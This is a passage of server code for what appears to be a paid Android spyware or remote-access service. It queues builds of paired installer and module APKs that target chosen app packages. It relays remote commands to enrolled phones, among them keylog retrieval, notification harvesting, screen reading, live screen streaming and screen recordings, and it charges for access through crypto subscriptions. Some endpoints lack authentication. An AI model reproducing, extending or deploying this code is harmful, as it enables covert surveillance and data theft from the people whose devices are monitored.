//   4. Files land in apk-output/<accessId>/{Module.apk,Installer.apk}.
//
// One job runs at a time. Pending jobs are kept in FIFO order. A finished
// job is moved to `recentBuildJobs` (capped) so the UI can fetch its log.
const BUILD_OUTPUT_ROOT = path.join(__dirname, '..', 'apk-output');
const BUILD_JOBS_MAX_LINES = 4000;
const BUILD_JOBS_RECENT_KEEP = 50;
const BUILD_WORKER_OFFLINE_MS = 30000;

const buildJobs = [];          // pending  (FIFO)
let   activeBuildJob = null;   // currently running on a worker
const recentBuildJobs = [];    // last N finished, newest first
let   buildWorkerLastSeen = 0;
const buildWorkerLongPollers = []; // [{ res, timer }]

function workerOnline() {
    return buildWorkerLastSeen > 0 && (Date.now() - buildWorkerLastSeen) < BUILD_WORKER_OFFLINE_MS;
}

function findJobByIdAnywhere(id) {
    if (activeBuildJob && activeBuildJob.id === id) return activeBuildJob;
    return buildJobs.find(j => j.id === id) || recentBuildJobs.find(j => j.id === id) || null;
}

function findJobForUser(accessId, includeRecent = true) {
    if (activeBuildJob && activeBuildJob.accessId === accessId) return activeBuildJob;
    const pending = [...buildJobs].reverse().find(j => j.accessId === accessId);
    if (pending) return pending;
    if (includeRecent) return recentBuildJobs.find(j => j.accessId === accessId) || null;
    return null;
}

function pushJobLine(job, line) {
    if (!job) return;
    job.lines.push(line);
    if (job.lines.length > BUILD_JOBS_MAX_LINES) {
        job.lines.splice(0, job.lines.length - BUILD_JOBS_MAX_LINES);
    }
    if (job.sseId) sseSend(job.sseId, 'build:log', { jobId: job.id, line });
}

function notifyWorkerLongPollers() {
    while (buildWorkerLongPollers.length > 0 && buildJobs.length > 0 && !activeBuildJob) {
        const waiter = buildWorkerLongPollers.shift();
        clearTimeout(waiter.timer);
        try { dispatchNextJobToWorker(waiter.res); } catch (_) {}
    }
}

function dispatchNextJobToWorker(res) {
    if (activeBuildJob || buildJobs.length === 0) {
        return res.json({ success: true, hasJob: false });
    }
    const job = buildJobs.shift();
    job.status = 'running';
    job.startedAt = Date.now();
    activeBuildJob = job;
    pushJobLine(job, `▶ Picked up by worker @ ${new Date().toISOString()}`);
    res.json({
        success: true,
        hasJob: true,
        job: {
            id:                 job.id,
            accessId:           job.accessId,
            moduleName:         job.moduleName,
            modulePackage:      job.modulePackage,
            installerName:      job.installerName,
            installerPackage:   job.installerPackage,
            monitoredPackages:  job.monitoredPackages,
        },
    });
}

function isValidPackage(s) {
    return typeof s === 'string' && /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/.test(s);
}
function isValidAppName(s) {
    return typeof s === 'string' && s.length > 0 && s.length <= 40 && /^[\w .&'-]+$/.test(s);
}
function sanitizeMonitoredPackages(input) {
    // Accept array of strings OR comma/newline separated string. Returns
    // de-duplicated, validated list of Java package names.
    let arr = [];
    if (Array.isArray(input)) arr = input;
    else if (typeof input === 'string') arr = input.split(/[\s,]+/);
    else return [];
    const seen = new Set();
    const out = [];
    for (const raw of arr) {
        const s = String(raw || '').trim();
        if (!s) continue;
        if (!isValidPackage(s)) continue;
        if (seen.has(s)) continue;
        seen.add(s);
        out.push(s);
        if (out.length >= 200) break;
    }
    return out;
}

// Build-worker auth: shared secret from buildWorkerSettings.apiKey.
//
// On commercial PaaS hosts (Heroku/Zeabur/Render/Fly/Railway) the worker
// usually fails to come "online" for one of three reasons:
//   1. The backend's API key env var is not set (or was wiped by a restart).
//   2. The worker is sending a key that doesn't match (typo / extra whitespace
//      from copy-paste / different env var name on each side).
//   3. The worker can't reach the backend at all (wrong BUILD_URL, dyno
//      sleeping, platform blocking the request).
//
// We log each failure with enough detail to diagnose which of these it is,
// rate-limited so a misconfigured worker can't flood the log buffer.
const _workerAuthLog = { lastAt: 0, suppressed: 0 };
function _logWorkerAuthFailure(reason, req, extra = '') {
    const now = Date.now();
    if (now - _workerAuthLog.lastAt < 5000) {
        _workerAuthLog.suppressed++;
        return;
    }
    const ip = (req.headers['x-forwarded-for'] || req.ip || 'unknown').toString().split(',')[0].trim();
    const ua = (req.headers['user-agent'] || '-').toString().slice(0, 60);
    const suppressedMsg = _workerAuthLog.suppressed > 0
        ? ` (+${_workerAuthLog.suppressed} similar suppressed in last 5 s)` : '';
    log('BUILD', `Worker auth FAILED: ${reason}${extra ? ' — ' + extra : ''} | ip=${ip} ua=${ua}${suppressedMsg}`, 'warn');
    _workerAuthLog.lastAt = now;
    _workerAuthLog.suppressed = 0;
}

function requireBuildWorker(req, res, next) {
    const token = ((req.headers['authorization'] || '').replace(/^Bearer\s+/i, '')
                || req.headers['x-build-worker-key']
                || req.query.key
                || '').toString().trim();
    const expected = buildWorkerSettings.apiKey;
    if (!expected) {
        _logWorkerAuthFailure('API key not configured on backend', req,
            'set BUILD_WORKER_API_KEY env var, or use Settings → Build worker key');
        return res.status(503).json({
            success: false,
            error: 'Build worker API key not configured on the backend. Set the BUILD_WORKER_API_KEY environment variable, or set it from the admin Settings page.',
        });
    }
    if (!token) {
        _logWorkerAuthFailure('worker sent no Authorization header', req);
        return res.status(401).json({ success: false, error: 'Missing build worker key (Authorization: Bearer <key>)' });
    }
    if (token !== expected) {
        _logWorkerAuthFailure('key mismatch', req,
            `worker sent length=${token.length}, backend expects length=${expected.length}`);
        return res.status(401).json({ success: false, error: 'Invalid build worker key' });
    }
    buildWorkerLastSeen = Date.now();
    next();
}

// POST /api/build/apk — enqueue a build job for the worker
app.post('/api/build/apk', requireUserOrAdmin, express.json(), async (req, res) => {
    const { moduleName, modulePackage, installerName, installerPackage, sseId, monitoredPackages } = req.body || {};
    if (!isValidAppName(moduleName))         return res.status(400).json({ success: false, error: 'Invalid module name (1-40 chars, letters/digits/space/.&\'-)' });
    if (!isValidPackage(modulePackage))      return res.status(400).json({ success: false, error: 'Invalid module package (e.g. com.example.app)' });
    if (!isValidAppName(installerName))      return res.status(400).json({ success: false, error: 'Invalid installer name' });
    if (!isValidPackage(installerPackage))   return res.status(400).json({ success: false, error: 'Invalid installer package' });
    if (modulePackage === installerPackage)  return res.status(400).json({ success: false, error: 'Module and installer packages must differ' });

    let accessId = '';
    if (req.authRole === 'user') {
        const u = await User.findById(req.authUserId).select('accessId').lean();
        accessId = (u && u.accessId) || '';
        if (!accessId) return res.status(400).json({ success: false, error: 'No Access ID assigned to your account.' });
    } else {
        accessId = (req.body.accessId && String(req.body.accessId).trim()) || 'ADMIN-BUILD';
    }

    // One pending/active job per user at a time.
    const existing = (activeBuildJob && activeBuildJob.accessId === accessId)
                  || buildJobs.some(j => j.accessId === accessId);
    if (existing) {
        return res.status(409).json({ success: false, error: 'You already have a build in progress. Please wait for it to finish.' });
    }

    const job = {
        id: crypto.randomBytes(12).toString('hex'),
        accessId,
        moduleName, modulePackage, installerName, installerPackage,
        monitoredPackages: sanitizeMonitoredPackages(monitoredPackages),
        sseId: sseId || null,
        status: 'pending',
        lines: [],
        createdAt:  Date.now(),
        startedAt:  0,
        finishedAt: 0,
        success: null,
        error: null,
    };
    buildJobs.push(job);

    pushJobLine(job, `📥 Job queued for Access ID ${accessId} (id ${job.id})`);
    pushJobLine(job, `  Module:    ${moduleName} (${modulePackage})`);
    pushJobLine(job, `  Installer: ${installerName} (${installerPackage})`);
    if (job.monitoredPackages.length) {
        pushJobLine(job, `  Monitored packages (${job.monitoredPackages.length}): ${job.monitoredPackages.join(', ')}`);
    }
    if (!workerOnline()) {
        pushJobLine(job, `⚠ No build worker is currently connected — job will start as soon as a worker comes online.`);
    } else {
        pushJobLine(job, `⏳ Waiting for the worker to pick it up…`);
    }

    notifyWorkerLongPollers();

    res.json({
        success: true,
        accessId,
        jobId: job.id,
        workerOnline: workerOnline(),
        message: workerOnline() ? 'Build queued.' : 'Build queued (waiting for worker).',
    });
});

// GET /api/build/status — caller's most-recent job (active, pending, or recent)
app.get('/api/build/status', requireUserOrAdmin, async (req, res) => {
    let myAccessId = '';
    if (req.authRole === 'user') {
        const u = await User.findById(req.authUserId).select('accessId').lean();
        myAccessId = (u && u.accessId) || '';
    } else {
        myAccessId = (req.query.accessId && String(req.query.accessId).trim()) || (activeBuildJob && activeBuildJob.accessId) || 'ADMIN-BUILD';
    }

    const job = findJobForUser(myAccessId, true);
    if (!job) {
        return res.json({
            success:      true,
            running:      false,
            isMyBuild:    false,
            workerOnline: workerOnline(),
            lines:        [],
        });
    }
    res.json({
        success:      true,
        running:      job.status === 'pending' || job.status === 'running',
        isMyBuild:    true,
        workerOnline: workerOnline(),
        accessId:     job.accessId,
        jobId:        job.id,
        status:       job.status,
        success_:     job.success,
        error:        job.error,
        createdAt:    job.createdAt,
        startedAt:    job.startedAt,
        finishedAt:   job.finishedAt,
        lines:        job.lines.slice(-300),
    });
});

// Short-lived, single-use download tickets (kept in-memory; ~60s TTL).
// Lets the browser stream APKs directly via a plain <a href> navigation
// (native progress + instant start) without putting the JWT in the URL.
const _downloadTickets = new Map(); // ticket -> { accessId, type, expiresAt, used }
function _issueDownloadTicket(accessId, type) {
    const ticket = crypto.randomBytes(24).toString('hex');
    _downloadTickets.set(ticket, {
        accessId,
        type,
        expiresAt: Date.now() + 60 * 1000,
        used: false,
    });
    return ticket;
}
setInterval(() => {
    const now = Date.now();
    for (const [t, v] of _downloadTickets) {
        if (v.expiresAt < now) _downloadTickets.delete(t);
    }
}, 30 * 1000).unref?.();

async function _resolveAccessIdForReq(req) {
    if (req.authRole === 'user') {
        const u = await User.findById(req.authUserId).select('accessId').lean();
        return (u && u.accessId) || '';
    }
    return (req.query.accessId && String(req.query.accessId).trim())
        || (activeBuildJob && activeBuildJob.accessId)
        || 'ADMIN-BUILD';
}

// POST /api/build/download/:type/ticket — issue a short-lived ticket
app.post('/api/build/download/:type/ticket', requireUserOrAdmin, async (req, res) => {
    const { type } = req.params;
    if (type !== 'module' && type !== 'installer') {
        return res.status(400).json({ success: false, error: 'type must be module or installer' });
    }
    const accessId = await _resolveAccessIdForReq(req);
    if (!accessId) return res.status(404).json({ success: false, error: 'No Access ID' });

    const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
    const apkPath  = path.join(BUILD_OUTPUT_ROOT, accessId, filename);
    if (!fs.existsSync(apkPath)) {
        return res.status(404).json({ success: false, error: 'APK not found. Run a build first.' });
    }
    const ticket = _issueDownloadTicket(accessId, type);
    res.json({ success: true, ticket, url: `/api/build/download/${type}?ticket=${ticket}` });
});

// GET /api/build/download/:type  (type = module|installer)
// Auth: either a normal Bearer/?token= (HEAD probes, admin), OR a one-time ?ticket=
app.get('/api/build/download/:type', async (req, res, next) => {
    const { type } = req.params;
    if (type !== 'module' && type !== 'installer') {
        return res.status(400).json({ success: false, error: 'type must be module or installer' });
    }

    // Ticket path (used by direct browser downloads from the dashboard)
    const ticket = req.query.ticket && String(req.query.ticket);
    if (ticket) {
        const entry = _downloadTickets.get(ticket);
        if (!entry || entry.used || entry.expiresAt < Date.now() || entry.type !== type) {
            return res.status(401).json({ success: false, error: 'Invalid or expired download ticket' });
        }
        entry.used = true;
        _downloadTickets.delete(ticket);

        const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
        const apkPath  = path.join(BUILD_OUTPUT_ROOT, entry.accessId, filename);
        if (!fs.existsSync(apkPath)) {
            return res.status(404).json({ success: false, error: 'APK not found. Run a build first.' });
        }
        return res.download(apkPath, filename);
    }

    // Fall through to normal auth (used for HEAD availability probes)
    return requireUserOrAdmin(req, res, async () => {
        const accessId = await _resolveAccessIdForReq(req);
        if (!accessId) return res.status(404).json({ success: false, error: 'No Access ID' });

        const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
        const apkPath  = path.join(BUILD_OUTPUT_ROOT, accessId, filename);
        if (!fs.existsSync(apkPath)) {
            return res.status(404).json({ success: false, error: 'APK not found. Run a build first.' });
        }
        res.download(apkPath, filename);
    });
});

// ── BUILD WORKER ENDPOINTS (called by build.sh in --worker mode) ────────────
// Long-poll for the next job. Resolves immediately when a job is available,
// otherwise waits up to ~25s and returns hasJob:false (worker re-polls).
app.get('/api/build/worker/poll', requireBuildWorker, (req, res) => {
    if (!activeBuildJob && buildJobs.length > 0) {
        return dispatchNextJobToWorker(res);
    }
    const timer = setTimeout(() => {
        const idx = buildWorkerLongPollers.findIndex(w => w.res === res);
        if (idx >= 0) buildWorkerLongPollers.splice(idx, 1);
        if (!res.headersSent) res.json({ success: true, hasJob: false });
    }, 25000);
    buildWorkerLongPollers.push({ res, timer });
    res.on('close', () => {
        clearTimeout(timer);
        const idx = buildWorkerLongPollers.findIndex(w => w.res === res);
        if (idx >= 0) buildWorkerLongPollers.splice(idx, 1);
    });
});

// Append log lines from worker. Body: { lines: [...] } or { line: "..." }
app.post('/api/build/worker/log/:jobId', requireBuildWorker, express.json({ limit: '2mb' }), (req, res) => {
    const job = findJobByIdAnywhere(req.params.jobId);
    if (!job) return res.status(404).json({ success: false, error: 'Unknown job' });
    const lines = Array.isArray(req.body?.lines) ? req.body.lines
                : (typeof req.body?.line === 'string' ? [req.body.line] : []);
    for (const ln of lines) {
        if (typeof ln === 'string' && ln.length > 0) pushJobLine(job, ln);
    }
    res.json({ success: true });
});

// Upload a built APK from the worker. type = module | installer.
// Body is the raw APK bytes (Content-Type: application/octet-stream).
app.post('/api/build/worker/upload/:jobId/:type', requireBuildWorker,
    express.raw({ type: '*/*', limit: '300mb' }),
    (req, res) => {
        const job = findJobByIdAnywhere(req.params.jobId);
        if (!job) return res.status(404).json({ success: false, error: 'Unknown job' });
        const { type } = req.params;
        if (type !== 'module' && type !== 'installer') {
            return res.status(400).json({ success: false, error: 'type must be module or installer' });
        }
        const buf = req.body;
        if (!buf || !buf.length) return res.status(400).json({ success: false, error: 'Empty upload' });

        const dir = path.join(BUILD_OUTPUT_ROOT, job.accessId);
        try { fs.mkdirSync(dir, { recursive: true }); } catch (_) {}
        const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
        const dest = path.join(dir, filename);
        fs.writeFileSync(dest, buf);
        pushJobLine(job, `⬆ Uploaded ${filename} (${(buf.length / 1024 / 1024).toFixed(2)} MB)`);
        res.json({ success: true });
    }
);

// Mark the job complete. Body: { success: bool, error?: string }
app.post('/api/build/worker/complete/:jobId', requireBuildWorker, express.json(), (req, res) => {
    const job = findJobByIdAnywhere(req.params.jobId);
    if (!job) return res.status(404).json({ success: false, error: 'Unknown job' });
    const ok = !!req.body?.success;
    job.status     = ok ? 'success' : 'failed';
    job.success    = ok;
    job.error      = ok ? null : (req.body?.error || 'Build failed');
    job.finishedAt = Date.now();
    pushJobLine(job, '');
    pushJobLine(job, ok ? '✅ BUILD SUCCESS' : `❌ BUILD FAILED — ${job.error}`);
    if (job.sseId) sseSend(job.sseId, 'build:done', {
        jobId: job.id, success: ok, accessId: job.accessId,
        durationMs: job.finishedAt - job.startedAt, error: job.error,
    });
    if (activeBuildJob && activeBuildJob.id === job.id) activeBuildJob = null;
    recentBuildJobs.unshift(job);
    if (recentBuildJobs.length > BUILD_JOBS_RECENT_KEEP) recentBuildJobs.pop();
    notifyWorkerLongPollers();
    res.json({ success: true });
});

// GET /api/build/worker/health — PUBLIC, no-auth diagnostic endpoint.
// Lets you (or your worker) verify, with a single curl, that:
//   • the backend on Heroku/Zeabur/etc. is actually reachable at the URL the
//     worker is using as BUILD_URL,
//   • the BUILD_WORKER_API_KEY env var is configured on the backend,
//   • whether a worker has successfully authenticated recently.
// Intentionally returns NO secret material — only booleans and a length, so
// it is safe to expose publicly.
//
// Typical commercial-deployment debugging flow:
//   curl -i https://<your-backend>/api/build/worker/health
//   → if you get HTML or 404, your BUILD_URL on the worker is wrong.
//   → if apiKeyConfigured=false, set BUILD_WORKER_API_KEY on the backend.
//   → if apiKeyConfigured=true but workerOnline=false even though the worker
//     is running, the worker's key doesn't match (check whitespace/typos)
//     or it can't reach the backend (check the worker's own logs).
app.get('/api/build/worker/health', (req, res) => {
    const host = req.get('x-forwarded-host') || req.get('host') || '';
    const proto = req.get('x-forwarded-proto') || (req.secure ? 'https' : 'http');
    res.set('Cache-Control', 'no-store');
    res.json({
        ok: true,
        backendReachable:  true,
        publicUrl:         host ? `${proto}://${host}` : null,
        apiKeyConfigured:  !!buildWorkerSettings.apiKey,
        apiKeyLength:      buildWorkerSettings.apiKey ? buildWorkerSettings.apiKey.length : 0,
        workerOnline:      workerOnline(),
        workerLastSeenAgoMs: buildWorkerLastSeen ? (Date.now() - buildWorkerLastSeen) : null,
        workerLastSeenAt:    buildWorkerLastSeen || null,
        pendingJobs:       buildJobs.length,
        activeJob:         activeBuildJob ? activeBuildJob.id : null,
        serverTimeMs:      Date.now(),
    });
});

// GET /api/build/worker/status — admin-only worker liveness + queue snapshot
app.get('/api/build/worker/status', requireAdmin, (req, res) => {
    res.json({
        success:      true,
        keyConfigured: !!buildWorkerSettings.apiKey,
        workerOnline: workerOnline(),
        lastSeen:     buildWorkerLastSeen || null,
        active:       activeBuildJob ? { jobId: activeBuildJob.id, accessId: activeBuildJob.accessId } : null,
        pending:      buildJobs.length,
        recent:       recentBuildJobs.slice(0, 10).map(j => ({
            jobId: j.id, accessId: j.accessId, status: j.status,
            startedAt: j.startedAt, finishedAt: j.finishedAt,
        })),
    });
});

// ============================================
// REST ENDPOINTS
// ============================================
app.get('/api/devices', requireUserOrAdmin, async (req, res) => {
    try {
        const filter = {};
        if (req.authRole === 'user') {
            const u = await User.findById(req.authUserId).select('accessId').lean();
            const aid = (u && u.accessId) || '';
            if (!aid) return res.json({ success: true, devices: [] });
            filter.accessId = aid;
        }
        const devices = await Device.find(filter).sort({ lastSeen: -1 });
        res.json({ success: true, devices });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.get('/api/devices/:deviceId', requireUserOrAdmin, async (req, res) => {
    try {
        const device = await Device.findOne({ deviceId: req.params.deviceId });
        if (!device) return res.status(404).json({ success: false, error: 'Device not found' });
        if (req.authRole === 'user') {
            const u = await User.findById(req.authUserId).select('accessId').lean();
            const aid = (u && u.accessId) || '';
            if (!aid || (device.accessId || '') !== aid) {
                return res.status(404).json({ success: false, error: 'Device not found' });
            }
        }
        res.json({ success: true, device });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// ── Flush pending command queue — called automatically at limit or on demand ──
function flushPendingQueue(deviceId) {
    const toFlush = deviceId
        ? [...pendingCmds.entries()].filter(([, p]) => p.deviceId === deviceId)
        : [...pendingCmds.entries()];

    for (const [cid, pending] of toFlush) {
        clearTimeout(pending.timer);
        if (pending.sseId) sseSend(pending.sseId, 'command:result', {
            commandId: cid, command: pending.command, deviceId: pending.deviceId,
            success: false, error: 'Queue reset — too many pending commands',
            timestamp: new Date()
        });
        pendingCmds.delete(cid);
    }

    if (toFlush.length) {
        log('CMD', `Queue flushed — cleared ${toFlush.length} pending commands${deviceId ? ' for ' + deviceId : ''}`, 'warn');
        broadcastDash('queue:reset', { deviceId: deviceId || null, cleared: toFlush.length, timestamp: new Date() });

        // Signal the device to reset its connection so it reconnects cleanly
        const targets = deviceId ? [deviceId] : [...new Set(toFlush.map(([, p]) => p.deviceId))];
        for (const did of targets) {
            const tcpId = deviceToTcp.get(did);
            const tc    = tcpId ? tcpClients.get(tcpId) : null;
            if (tc && tc.writable) {
                tcpSend(tc, 'connection:reset', { reason: 'queue_overflow', timestamp: Date.now() });
            }
        }
    }
}

const PENDING_CMD_LIMIT = 39;

app.post('/api/commands', requireUserOrAdmin, requireActiveSubscription, async (req, res) => {
    const { deviceId, command, params, sseClientId } = req.body;
    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
    if (!COMMANDS[command]) return res.status(400).json({ error: `Unknown command: ${command}` });

    // ── All commands (including list_screen_recordings / get_screen_recording / delete_screen_recording)
    //    are forwarded to the device — recordings are stored ONLY on Android ──

    // ── For all commands: require device to be online ──
    const tcpConnId = deviceToTcp.get(deviceId);
    const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
    if (!tcpConn || !tcpConn.writable) return res.status(503).json({ error: 'Device offline', deviceId });

    // ── Special: restart_connection — send connection:reset directly, no command queue ──
    if (command === 'restart_connection') {
        tcpSend(tcpConn, 'connection:reset', { reason: 'dashboard_request', timestamp: Date.now() });
        log('CMD', `restart_connection → ${deviceId} (connection:reset sent)`);
        return res.json({ success: true, command, deviceId, status: 'reset_sent', timestamp: new Date() });
    }

    // ── Queue overflow protection: flush at PENDING_CMD_LIMIT ──
    const devicePendingCount = [...pendingCmds.values()].filter(p => p.deviceId === deviceId).length;
    if (devicePendingCount >= PENDING_CMD_LIMIT) {
        flushPendingQueue(deviceId);
        return res.status(429).json({
            error: `Queue limit (${PENDING_CMD_LIMIT}) reached — queue has been reset. Retry your command.`,
            queueReset: true, deviceId
        });
    }

    const commandId = crypto.randomBytes(12).toString('hex');

    // Forward to device immediately — no queue, fire and forget over TCP
    tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });

    // Track streaming state so we can auto-resume after stream channel reconnects
    if (command === 'stream_start')  deviceStreamingState.add(deviceId);
    if (command === 'stream_stop')   deviceStreamingState.delete(deviceId);

    // Track pending so command:response can route the result back via SSE
    const timer = setTimeout(() => {
        if (pendingCmds.has(commandId)) {
            pendingCmds.delete(commandId);
            // Broadcast timeout to all SSE clients — SSE may have reconnected with a new ID
            broadcastDash('command:result', {
                commandId, command, deviceId, success: false,
                error: 'Command timed out', timestamp: new Date()
            });
        }
    }, CMD_TIMEOUT_MS);
    pendingCmds.set(commandId, { sseId: sseClientId || null, command, deviceId, timer });

    // Respond immediately — command already sent to device via TCP
    res.json({ success: true, commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
    // Skip logging for high-frequency polling commands
    const silentCmds = new Set(['get_keylogs','get_notifications','get_notifications_from_app',
                                 'screen_reader_read','wake_screen']);
    if (!silentCmds.has(command)) {
        log('CMD', `${command} → ${deviceId} [${commandId}]`);
    }

    // Persist to DB fire-and-forget
    new Command({ id: commandId, deviceId, command, data: params || {}, status: 'executing' }).save().catch(() => {});
});

// ── Manual queue flush endpoint ───────────────────────────────────────────────
app.post('/api/commands/flush', (req, res) => {
    const { deviceId } = req.body || {};
    flushPendingQueue(deviceId || null);
    res.json({ success: true, message: 'Queue flushed', pendingBefore: pendingCmds.size });
});

// ── Dashboard session reset — called when ScreenControl / ScreenReader refreshes ──
// Clears all volatile session state for a device without touching MongoDB or the
// live TCP connection.  Specifically:
//   • Cancels every pending command timer and removes it from the in-memory map
//   • Removes the device from the active-streaming set
//   • Resets the per-device frame-relay throttle timestamp
//   • Scans Redis and deletes every command:* cache key (screenshots, frame blobs, results)
app.post('/api/device/:deviceId/reset-session', async (req, res) => {
    const { deviceId } = req.params;
    if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });

    // 1. Cancel and remove all pending commands for this device
    let cleared = 0;
    for (const [cid, pending] of pendingCmds.entries()) {
        if (pending.deviceId === deviceId) {
            clearTimeout(pending.timer);
            pendingCmds.delete(cid);
            cleared++;
        }
    }

    // 2. Remove from active streaming set
    deviceStreamingState.delete(deviceId);

    // 3. Reset frame throttle timestamp
    deviceLastFrameMs.delete(deviceId);

    // 4. Clear all command:* keys from Redis (command result cache, screenshot blobs, etc.)
    const redisCleared = await R.clearCommandCache();

    log('SESSION', `reset-session for ${deviceId}: ${cleared} pending cmd(s) cleared, ${redisCleared} Redis key(s) removed`);
    res.json({ success: true, deviceId, pendingCleared: cleared, redisKeysRemoved: redisCleared });
});

// ── Task Studio — MongoDB-backed workflow storage (tasks are GLOBAL) ──────────
app.get('/api/tasks', async (req, res) => {
    try {
        const tasks = await Task.find({}).sort({ updatedAt: -1 });
        res.json({ success: true, tasks });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// Keep legacy route for backward compat — also returns all tasks
app.get('/api/tasks/:deviceId', async (req, res) => {
    try {
        const tasks = await Task.find({}).sort({ updatedAt: -1 });
        res.json({ success: true, tasks });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.post('/api/tasks', async (req, res) => {
    const { deviceId, name, steps, _id } = req.body || {};
    if (!name) return res.status(400).json({ success: false, error: 'name required' });
    try {
        let task;
        if (_id) {
            task = await Task.findByIdAndUpdate(_id, { name, steps: steps || [], updatedAt: new Date() }, { new: true });
            if (!task) return res.status(404).json({ success: false, error: 'Task not found' });
        } else {
            task = await new Task({ deviceId: deviceId || 'global', name, steps: steps || [] }).save();
        }
        res.json({ success: true, task });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.delete('/api/tasks/:taskId', async (req, res) => {
    try {
        await Task.findByIdAndDelete(req.params.taskId);
        res.json({ success: true });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.get('/api/commands/registry', (req, res) => res.json({ success: true, commands: COMMANDS }));

app.get('/api/health', async (req, res) => {
    const redisStats = await R.getStats();
    res.json({
        status: 'ok',
        mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
        redis: redisStats.connected
            ? `connected (${redisStats.onlineDevices} online / ${redisStats.totalDevices} total devices, mem: ${redisStats.memoryUsed})`
            : `disconnected${redisStats.error ? ' — ' + redisStats.error : ''}`,
        tcpClients: tcpClients.size,
        sseClients: sseClients.size,
        connectedDevices: deviceToTcp.size,
        pendingCommands: pendingCmds.size,
        tcpPort: TCP_PORT,
        httpPort: HTTP_PORT,
        uptime: process.uptime()
    });
});

app.get('/api/admin/users', requireAdmin, async (req, res) => {
    try {
        const docs = await User.find({}, '-password').sort({ createdAt: -1 });
        const users = docs.map(u => ({
            _id:            u._id,
            accessId:       u.accessId,
            email:          u.email,
            name:           u.name,
            role:           u.role,
            tier:           u.tier,
            trialStartDate: u.trialStartDate,
            trialEndDate:   u.trialEndDate,
            paidUntil:      u.paidUntil,
            isTrialActive:  u.isTrialActive(),
            subscription:   u.subscriptionStatus(),
            lastLogin:      u.lastLogin,
            createdAt:      u.createdAt,
            paymentHistory: (u.paymentHistory || []).slice(-5),
        }));
        res.json({ success: true, users });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// ============================================================================
// PAYMENT / SUBSCRIPTION
// ----------------------------------------------------------------------------
// Free trial: 7 days from signup (set in User pre-save hook).
// After trial ends, /api/commands returns 402; the dashboard shows a paywall
// pointing at NOWPayments. When the buyer completes payment, NOWPayments POSTs
// an IPN to /api/payment/webhook/nowpayments, which extends paidUntil by 30
// days. Admins can also grant time manually.
// ============================================================================

// GET /api/payment/me — returns current sub status + a personalised payment URL.
app.get('/api/payment/me', requireUserOrAdmin, async (req, res) => {
    if (req.authRole === 'admin') {
        return res.json({
            success: true,
            role: 'admin',
            isTrialActive: true,
            paywall: {
                priceUsd:   paymentSettings.priceUsd,
                extendDays: paymentSettings.extendDays,
                paymentUrl: paymentSettings.paymentUrl,
            },
        });
    }
    try {
        const user = await User.findById(req.authUserId).select(
            'tier email accessId trialStartDate trialEndDate paidUntil'
        );
        if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
        res.json({
            success: true,
            role: 'user',
            email: user.email,
            tier:  user.tier,
            trialStartDate: user.trialStartDate,
            trialEndDate:   user.trialEndDate,
            paidUntil:      user.paidUntil,
            isTrialActive:  user.isTrialActive(),
            trialDaysLeft:  user.trialDaysLeft(),
            subscription:   user.subscriptionStatus(),
            paywall: {
                priceUsd:   paymentSettings.priceUsd,
                extendDays: paymentSettings.extendDays,
                paymentUrl: buildPaymentUrl(user),
            },
        });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/payment/webhook/nowpayments — IPN endpoint for NOWPayments.
// Verifies HMAC-SHA512(JSON-with-sorted-keys, ipnSecret) against the
// `x-nowpayments-sig` header. On a `finished` payment, locates the user by
// `order_id` (we set this to the user's _id when building the payment URL) or
// by `customer_email` as a fallback, then extends `paidUntil` by 30 days.
app.post('/api/payment/webhook/nowpayments', async (req, res) => {
    try {
        const sig    = req.headers['x-nowpayments-sig'];
        const secret = paymentSettings.ipnSecret;
        const body   = req.body || {};

        if (!secret) {
            log('PAYMENT', 'Webhook hit but NOWPAYMENTS_IPN_SECRET is not set — refusing', 'warn');
            return res.status(503).json({ error: 'webhook_secret_not_configured' });
        }
        if (!sig) {
            log('PAYMENT', 'Webhook missing x-nowpayments-sig header', 'warn');
            return res.status(401).json({ error: 'missing_signature' });
        }

        const sortedJson = JSON.stringify(sortKeysDeep(body));
        const expected   = crypto.createHmac('sha512', secret).update(sortedJson).digest('hex');
        const sigBuf     = Buffer.from(String(sig), 'hex');
        const expBuf     = Buffer.from(expected, 'hex');
        if (sigBuf.length !== expBuf.length || !crypto.timingSafeEqual(sigBuf, expBuf)) {
            log('PAYMENT', 'Webhook signature mismatch — rejecting', 'warn');
            return res.status(401).json({ error: 'bad_signature' });
        }

        const status      = String(body.payment_status || body.status || '').toLowerCase();
        const orderId     = body.order_id || body.orderId || '';
        const customerEm  = body.customer_email || body.payer_email || body.email || '';
        const paymentId   = body.payment_id || body.paymentId || '';
        const invoiceId   = body.invoice_id || body.iid || '';
        const amountUsd   = Number(body.price_amount || body.priceAmount || 0);
        const payAmount   = Number(body.actually_paid || body.pay_amount || 0);
        const payCurrency = String(body.pay_currency || body.payCurrency || '');

        log('PAYMENT', `IPN received: status=${status} order_id=${orderId} email=${customerEm} usd=${amountUsd}`);

        // Acknowledge non-final states without modifying the account.
        const finalStates = new Set(['finished', 'confirmed', 'partially_paid']);
        if (!finalStates.has(status)) {
            return res.json({ ok: true, ignored: status });
        }

        // Locate the user by order_id (= our Mongo _id) or fall back to email.
        let user = null;
        if (orderId && mongoose.isValidObjectId(orderId)) {
            user = await User.findById(orderId);
        }
        if (!user && customerEm) {
            user = await User.findOne({ email: String(customerEm).toLowerCase().trim() });
        }
        if (!user) {
            log('PAYMENT', `No matching user for IPN (order_id=${orderId}, email=${customerEm})`, 'warn');
